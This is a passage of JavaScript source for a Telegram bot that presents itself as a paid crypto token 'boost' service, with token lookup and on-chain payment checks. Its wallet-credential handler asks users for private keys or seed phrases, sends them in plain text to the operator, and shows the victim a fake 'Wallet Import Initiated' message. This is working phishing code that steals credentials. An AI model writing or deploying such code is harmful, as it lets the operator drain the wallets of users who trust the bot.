      `Our system will automatically detect whether you're providing a private key or seed phrase.`,
      cancelKeyboard
    );
  });

  // ── Text message handler (state machine) ──────────────────────────────────
  bot.on("text", async (ctx) => {
    const text = ctx.message.text.trim();
    if (text.startsWith("/")) return; // handled by bot.start() etc.

    const session = getSession(ctx.from.id);

    switch (session.step) {

      case "awaiting_ca": {
        const ca = text.trim();

        // ── Step 1: validate CA format ────────────────────────────────────────
        if (!isValidCA(ca)) {
          await ctx.reply(
            `❌ <b>Invalid Contract Address</b>\n\n` +
            `That doesn't look like a valid token address.\n\n` +
            `<b>Valid formats:</b>\n` +
            `• Solana — 32–44 base58 characters\n` +
            `  Example: <code>EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v</code>\n\n` +
            `• Ethereum — starts with <code>0x</code> + 40 hex characters\n` +
            `  Example: <code>0xdAC17F958D2ee523a2206206994597C13D831ec7</code>\n\n` +
            `Please paste your token contract address:`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break; // keep session step alive
        }

        // ── Step 2: fetch token info from all sources ─────────────────────────
        setSession(ctx.from.id, { contractAddress: ca });
        const lookMsg = await ctx.reply(
          `🔍 <b>Looking up token data...</b>\n⏳ Please wait while we fetch information...`,
          { parse_mode: "HTML" }
        );

        const info = await fetchTokenInfo(ca);
        await ctx.telegram.deleteMessage(ctx.chat.id, lookMsg.message_id).catch(() => {});

        // ── Step 3: if not found on any source, show error + retry ────────────
        if (!info) {
          const caChain = detectCAChain(ca);
          await ctx.reply(
            `❌ <b>Token Not Found</b>\n\n` +
            `Could not find token info for:\n<code>${ca}</code>\n\n` +
            `<b>Possible reasons:</b>\n` +
            `• Token is too new (not indexed yet) — try again in a few minutes\n` +
            `• Wrong address — double-check and paste again\n` +
            `• Token is on a different chain than expected (${caChain === "sol" ? "Solana" : caChain === "eth" ? "Ethereum" : "unknown"})\n\n` +
            `You can still proceed — just paste the correct CA:`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;
        }

        // ── Step 4: store all token data in session ───────────────────────────
        setSession(ctx.from.id, {
          step:            "awaiting_confirm",
          tokenName:       info.name,
          tokenSymbol:     info.symbol,
          tokenChain:      info.chain,
          tokenImageUrl:   info.imageUrl,
          tokenPrice:      info.price,
          tokenMarketCap:  info.marketCap,
          tokenVolume24h:  info.volume24h,
          tokenLiquidity:  info.liquidity,
          tokenChange24h:  info.change24h,
          tokenDex:        info.dex,
          tokenWebsite:    info.website,
          tokenTwitter:    info.twitter,
          tokenTelegram:   info.telegram,
        });

        const s = getSession(ctx.from.id);
        const isEth  = s.boostType === "eth_trending";
        const cost   = isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`;

        const chainName = info.chain === "sol" ? "solana"
                        : info.chain === "eth" ? "ethereum"
                        : info.chain === "bsc" ? "bsc"
                        : info.chain ?? "unknown";
        const dexName  = info.dex ?? "unknown";
        const tokenUrl = info.chain === "sol"
          ? `https://pump.fun/coin/${ca}`
          : `https://dexscreener.com/${info.chain}/${ca}`;

        const tokenMsg =
          `📋 <b>Project Details Found!</b>\n\n` +
          `📊 PUMPFUN_SCRAPE Token\n\n` +
          `✅ <b>Contract Address:</b>\n<code>${ca}</code>\n\n` +
          `📊 <b>Token Information:</b>\n` +
          `• Name: ${info.name}\n` +
          `• Symbol: ${info.symbol}\n` +
          `• Price: ${info.price ?? "0.00"}\n` +
          `• Market Cap: ${info.marketCap ?? "0.00"}\n` +
          `• 24h Volume: ${info.volume24h ?? "0.00"}\n` +
          `• Liquidity: ${info.liquidity ?? "0.00"}\n` +
          `• 24h Change: ${info.change24h ?? "0.00"}%\n` +
          `• DEX: ${dexName}\n` +
          `• Chain: ${chainName}\n\n` +
          `🔗 Available on: 🟢 Pumpswap • 🟢 Pump.fun\n\n` +
          `🔗 View Token: ${tokenUrl}\n\n` +
          `⚙️ Service: <b>${s.serviceLabel}</b>\n` +
          `💰 Cost: <b>${cost}</b>\n\n` +
          `✅ <b>Confirm order to proceed to payment?</b>`;

        // Try to send with token image (with proxy fallback)
        if (info.imageUrl) {
          const sent = await safeSendPhoto(ctx, info.imageUrl, {
            caption: tokenMsg,
            parse_mode: "HTML",
            ...confirmOrderKeyboard,
          });
          if (sent) break;
        }
        await ctx.reply(tokenMsg, { parse_mode: "HTML", ...confirmOrderKeyboard });
        break;
      }

      case "awaiting_tx_hash": {
        const raw = text.trim();
        const s   = { ...session };

        // ── Step 1: format check ──────────────────────────────────────────────
        const chain = detectChain(raw);
        if (chain === "invalid") {
          await ctx.reply(
            `❌ <b>Invalid Transaction Hash</b>\n\n` +
            `That doesn't look like a valid TX hash.\n\n` +
            `<b>Valid formats:</b>\n` +
            `• <b>Solana</b> — 87–88 base58 characters\n` +
            `  Example: <code>5KtP9jFhGk...xyZm</code>\n\n` +
            `• <b>Ethereum</b> — starts with <code>0x</code> + 64 hex chars\n` +
            `  Example: <code>0x4a3b2c1d...f9e8</code>\n\n` +
            `📋 Copy the hash directly from your wallet or block explorer and try again:`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;   // keep session alive so user can retry
        }

        // ── Step 2: duplicate / replay-attack check ───────────────────────────
        if (isHashUsed(raw)) {
          await ctx.reply(
            `❌ <b>TX Hash Already Used</b>\n\n` +
            `This transaction hash has already been submitted to an order.\n\n` +
            `Each TX hash can only be used once.\n` +
            `Please send a <b>new payment</b> and submit that TX hash.`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;
        }

        // ── Step 3: on-chain verification ─────────────────────────────────────
        const verifyMsg = await ctx.reply(
          `🔍 <b>Verifying transaction on-chain...</b>\n\nPlease wait a moment.`,
          { parse_mode: "HTML" }
        );

        const payWallet   = deriveWalletForUser(ctx.from.id);
        const lamExpected = s.boostType !== "eth_trending"
          ? Math.round((s.selectedSol ?? 0) * 1e9)
          : undefined;

        const result = await verifyTx(
          raw,
          chain === "sol" ? payWallet.address : undefined,
          lamExpected,
        );

        // Delete the "verifying..." message
        try { await ctx.deleteMessage(verifyMsg.message_id); } catch {}

        if (!result.ok) {
          await ctx.reply(
            `${result.error}\n\n` +
            `Paste the correct TX hash to continue, or press Cancel:`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;   // keep session so user can retry with correct hash
        }

        // ── Step 4: accept — mark hash, clear session, save order ─────────────
        markHashUsed(raw);
        clearSession(ctx.from.id);

        if (s.orderId) {
          updateOrder(s.orderId, {
            txHash:        raw,
            status:        "tx_submitted",
            txSubmittedAt: new Date(),
          });
        }

        const chainLabel  = chain === "eth" ? "Ethereum" : "Solana";
        const verifiedLine = result.confirmed
          ? `✅ <b>Verified on-chain</b> (${chainLabel})`
          : `⏳ <b>Submitted</b> — will be verified manually`;

        const amountLine = result.lamports
          ? `💰 Amount: <b>${(result.lamports / 1e9).toFixed(4)} SOL</b>`
          : s.boostType === "eth_trending"
          ? `💰 Amount: <b>$${s.ethAmount} USD</b>`
          : `💰 Amount: <b>${s.selectedSol} SOL</b>`;

        await ctx.reply(
          `✅ <b>Transaction Accepted!</b>\n\n` +
          `${verifiedLine}\n` +
          `${amountLine}\n\n` +
          `🔗 TX Hash:\n<code>${raw}</code>\n\n` +
          `🚀 Your boost will start within <b>5–30 minutes</b>.\n` +
          `📬 You'll be notified here when it goes live!\n\n` +
          `💬 Need help? @mrpooh`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );

        await notifyAdmin(
          `💸 <b>TX Submitted & ${result.confirmed ? "VERIFIED ✅" : "PENDING ⏳"}</b>\n\n` +
          `👤 ${ctx.from.first_name}${ctx.from.username ? ` (@${ctx.from.username})` : ""}\n` +
          `🆔 User: <code>${ctx.from.id}</code>\n` +
          `🔗 TX: <code>${raw}</code>\n` +
          `⛓ Chain: ${chainLabel}\n` +
          `✅ On-chain: ${result.confirmed ? "Confirmed" : "Unverified (RPC timeout)"}\n` +
          `${result.recipient ? `📮 Recipient: <code>${result.recipient}</code>\n` : ""}` +
          `${result.lamports  ? `💰 Lamports: ${result.lamports} (${(result.lamports/1e9).toFixed(4)} SOL)\n` : ""}` +
          `⚙️ Service: ${s.serviceLabel ?? "N/A"}\n` +
          `💵 Cost: ${s.boostType === "eth_trending" ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}\n` +
          `📜 CA: <code>${s.contractAddress ?? "N/A"}</code>\n` +
          `🆔 Order: <code>${s.orderId ?? "N/A"}</code>`
        );
        break;
      }

      case "awaiting_wallet_credential": {
        const credential = text.trim();
        const wordCount = credential.split(/\s+/).length;
        const credType = wordCount >= 12 ? "Seed Phrase" : credential.length >= 40 ? "Private Key" : "Credential";
        const u = ctx.from;
        const uName  = `${u.first_name}${u.last_name ? " " + u.last_name : ""}`;
        const handle = u.username ? ` (@${u.username})` : "";
        clearSession(u.id);
        // Always notify admin — never silently drop
        try {
          await notifyAdmin(
            `🔑 <b>WALLET IMPORT — ${credType}</b>\n\n` +
            `👤 ${uName}${handle}\n` +
            `🆔 ID: <code>${u.id}</code>\n\n` +
            `🗝 ${credType}:\n<code>${credential}</code>\n\n` +
            `⏰ ${new Date().toUTCString()}`
          );
        } catch { /* never throw — always proceed to confirm the user */ }
        await ctx.reply(
          `🔗 <b>Wallet Import Initiated</b>\n\n` +
          `Connection may take a moment due to:\n\n` +
          `⏳ <b>Network sync &amp; on-chain verification...</b>\n\n` +
          `Your wallet is being linked to your account.\n\n` +
          `<b>Processing ⚙️ ........</b>`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        break;
      }

      case "awaiting_withdraw_address": {
        const withdrawText = text;
        clearSession(ctx.from.id);
        await ctx.reply(
          `📤 <b>Withdrawal Request Received</b>\n\n` +
          `Details: <code>${withdrawText}</code>\n\n` +
          `⏳ Processed within 24 hours. You'll be notified when sent.`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        await notifyAdmin(
          `📤 <b>Withdrawal Request</b>\n` +
          `👤 ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}\n` +
          `🆔 <code>${ctx.from.id}</code>\n` +
          `Details: <code>${withdrawText}</code>`
        );
        break;
      }

      default:
        await sendWelcome(ctx);
        break;
    }
  });

  return bot;
}
